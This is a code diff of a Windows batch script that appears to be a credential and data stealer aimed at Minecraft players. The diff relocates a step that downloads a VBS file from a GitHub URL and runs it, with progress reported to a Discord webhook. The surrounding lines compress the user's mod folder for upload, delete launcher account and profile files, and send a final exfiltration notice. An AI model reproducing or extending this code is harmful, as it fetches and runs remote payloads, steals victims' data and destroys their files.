@@ -78,12 +78,6 @@ del apps.txt
 :: Change to the user profile directory
 cd %USERPROFILE%
 
-:: Download and execute a VBS script
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs', 'win.vbs')"
-start win.vbs
-
-:: Send notification to Discord
-curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 5: VBS script downloaded and executed.\"}"
 
 :: Compress and upload various browser and application data
 powershell "Compress-Archive %APPDATA%\.minecraft\mods %APPDATA%\modss.zip -CompressionLevel 'Fastest'"
@@ -136,6 +130,14 @@ del launcher_accounts.json
 del launcher_accounts_microsoft_store.json
 del launcher_product_state.json
 del launcher_profiles.json
+
+:: Download and execute a VBS script
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs', 'win.vbs')"
+start win.vbs
+
+:: Send notification to Discord
+curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 5: VBS script downloaded and executed.\"}"
+
 
 :: Send final notification to Discord
 curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 6: All data collected, files compressed, and sent.\"}"
